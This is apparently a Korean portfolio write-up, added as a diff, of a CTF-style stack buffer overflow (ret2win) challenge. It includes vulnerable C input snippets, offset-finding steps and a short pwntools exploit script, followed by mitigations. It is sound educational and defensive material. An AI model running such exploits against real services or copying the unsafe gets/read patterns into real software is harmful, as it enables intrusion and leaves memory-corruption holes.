@@ -1,0 +1,130 @@
+<h1 id="section-1">BOF01 라이트업 - Stack BOF 기본형</h1>
+<h2 id="section-2">1. 개요</h2>
+<p>BOF01은 스택 버퍼 오버플로우의 가장 기본적인 흐름을 정리한 학습형 라이트업이다. 핵심은 입력 길이 검증이
+없는 함수에서 지역 버퍼를 초과해 saved RBP와 return address 근처까지 덮을 수 있는지 확인하고, 제어 흐름을
+의도한 함수로 바꾸는 것이다.</p>
+<p>이 문서는 실제 서비스가 아니라 CTF/교육용 바이너리 분석을 기준으로 작성했다. 주소, 플래그, 민감 문자열은
+포트폴리오 공개용으로 남기지 않는다.</p>
+<h2 id="section-3">2. 분석 목표</h2>
+<div class="table-scroll"><table>
+<thead>
+<tr>
+<th>항목</th>
+<th>내용</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>취약점 유형</td>
+<td>Stack Buffer Overflow</td>
+</tr>
+<tr>
+<td>입력 지점</td>
+<td>표준 입력 또는 argv</td>
+</tr>
+<tr>
+<td>핵심 목표</td>
+<td>offset 계산 후 return address overwrite</td>
+</tr>
+<tr>
+<td>사용 도구</td>
+<td>checksec, GDB/pwndbg, Python, pwntools</td>
+</tr>
+<tr>
+<td>학습 포인트</td>
+<td>스택 프레임, saved RBP, RET, 엔디언, payload 구조</td>
+</tr>
+</tbody></table></div>
+<h2 id="section-4">3. 분석 루틴</h2>
+<pre><code class="language-text">보호기법 확인
+  -&gt; 입력 함수 확인
+  -&gt; 버퍼 크기와 스택 프레임 확인
+  -&gt; cyclic pattern으로 offset 계산
+  -&gt; 목표 함수 주소 확인
+  -&gt; payload 작성
+  -&gt; GDB에서 RET 변경 여부 검증
+</code></pre>
+<h2 id="section-5">4. 보호기법 확인</h2>
+<pre><code class="language-bash">checksec ./bof01
+</code></pre>
+<p>BOF01 기본형에서는 보통 Canary가 없고 PIE가 꺼져 있는 형태를 먼저 연습한다. 이 상태에서는 함수 주소가
+고정되어 있어 <code>win()</code> 또는 <code>shell()</code> 같은 목표 함수 주소로 return address를 덮는 방식이 가능하다.</p>
+<pre><code class="language-text">Canary: No
+NX: Enabled
+PIE: No
+</code></pre>
+<p>NX가 켜져 있어도 직접 shellcode를 스택에 올려 실행하지 않고, 이미 바이너리 안에 있는 함수를 호출한다면
+기본 ret2win 흐름으로 풀이할 수 있다.</p>
+<h2 id="section-6">5. 취약 함수 확인</h2>
+<p>IDA 또는 GDB disassemble로 입력 처리 함수를 확인한다.</p>
+<pre><code class="language-c">char buf[64];
+gets(buf);
+</code></pre>
+<p>또는 다음과 같은 형태가 취약 지점이 된다.</p>
+<pre><code class="language-c">char buf[64];
+read(0, buf, 200);
+</code></pre>
+<p>버퍼는 64바이트인데 입력은 그보다 크게 받을 수 있으므로, 스택에서 <code>buf -&gt; saved RBP -&gt; RET</code> 순서로
+덮이는지 확인한다.</p>
+<h2 id="section-7">6. offset 계산</h2>
+<p>GDB에서 cyclic pattern을 넣고 크래시 지점을 확인한다.</p>
+<pre><code class="language-bash">python3 - &lt;&lt;'PY'
+from pwn import *
+print(cyclic(120).decode())
+PY
+</code></pre>
+<pre><code class="language-gdb">run
+x/gx $rsp
+</code></pre>
+<p>크래시 후 RET 위치에 들어간 패턴을 <code>cyclic -l</code>로 계산한다.</p>
+<pre><code class="language-bash">cyclic -l &lt;crash_pattern&gt;
+</code></pre>
+<p>예시 구조:</p>
+<pre><code class="language-text">payload = b"A" * &lt;offset&gt;
+payload += p64(&lt;target_function&gt;)
+</code></pre>
+<h2 id="section-8">7. 목표 함수 주소 확인</h2>
+<p>PIE가 꺼져 있으면 <code>nm</code>이나 <code>objdump</code>로 함수 주소를 확인할 수 있다.</p>
+<pre><code class="language-bash">nm -n ./bof01 | grep -E "win|shell|flag"
+objdump -d ./bof01 | grep "&lt;win&gt;"
+</code></pre>
+<p>주소는 공개 포트폴리오에서 실제 값 대신 <code>&lt;win_address&gt;</code>로 기록한다.</p>
+<h2 id="section-9">8. exploit 작성</h2>
+<pre><code class="language-python">from pwn import *
+
+binary = "./bof01"
+elf = ELF(binary)
+
+offset = &lt;offset&gt;
+target = elf.symbols["win"]
+
+p = process(binary)
+payload = b"A" * offset
+payload += p64(target)
+
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>원격 문제라면 <code>process()</code> 대신 <code>remote(host, port)</code>로 바꿔 실행한다.</p>
+<h2 id="section-10">9. 검증 포인트</h2>
+<ul>
+<li>크래시가 단순 segmentation fault인지, RET overwrite까지 도달했는지 확인</li>
+<li>offset이 saved RBP가 아니라 return address 기준인지 확인</li>
+<li>64-bit 바이너리에서는 <code>p64()</code>, 32-bit 바이너리에서는 <code>p32()</code> 사용</li>
+<li>함수 호출 전 stack alignment 문제가 있으면 <code>ret</code> gadget을 하나 추가</li>
+<li>플래그 값은 보고서에 직접 남기지 않고 성공 조건만 기록</li>
+</ul>
+<h2 id="section-11">10. 대응 방안</h2>
+<ul>
+<li><code>gets</code>, <code>strcpy</code>, 제한 없는 <code>scanf("%s")</code> 사용 금지</li>
+<li>입력 길이 제한과 서버 측 검증 적용</li>
+<li>Canary, PIE, NX, RELRO 등 보호기법 활성화</li>
+<li>컴파일 단계에서 <code>-fstack-protector-strong</code>, <code>-D_FORTIFY_SOURCE=2</code> 적용</li>
+<li>크래시 로그와 비정상 입력 길이 모니터링</li>
+</ul>
+<h2 id="section-12">11. 학습한 점</h2>
+<ul>
+<li>BOF 기본형은 페이로드보다 스택 프레임을 정확히 이해하는 것이 먼저다.</li>
+<li>offset 계산은 감으로 하는 것이 아니라 cyclic pattern과 GDB로 검증해야 한다.</li>
+<li>NX가 켜져 있어도 기존 함수로 흐름을 돌리는 ret2win 방식은 가능하다.</li>
+<li>포트폴리오에는 정답 문자열보다 분석 루틴, offset 산출 근거, 대응 방안을 남기는 편이 더 좋다.</li>
+</ul>
